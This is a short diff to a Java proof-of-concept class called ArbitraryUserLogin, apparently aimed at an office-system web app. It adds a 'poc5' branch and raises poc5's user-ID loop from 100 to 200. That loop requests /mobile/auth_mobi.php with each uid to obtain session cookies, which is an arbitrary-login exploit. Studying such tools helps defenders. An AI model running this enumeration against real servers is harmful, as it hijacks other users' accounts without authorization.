@@ -20,6 +20,8 @@ public class ArbitraryUserLogin {
             return poc3(url);
         } else if (poc.equals("poc4")) {
             return poc4(url);
+        } else if (poc.equals("poc5")) {
+            return poc5(url);
         } else {
             System.out.println("未知的POC编号");
             return null;
@@ -137,7 +139,7 @@ public class ArbitraryUserLogin {
     public static String poc5(String url) {
         String cookie = null;
         String params = "/mobile/auth_mobi.php?isAvatar=1&uid=%d&P_VER=0";
-        for (int i = 1; i <= 100; i++) {
+        for (int i = 1; i <= 200; i++) {
             String payload = String.format(params, i);
 //            System.out.println(payload);
             Response response = Request.get(url + payload);
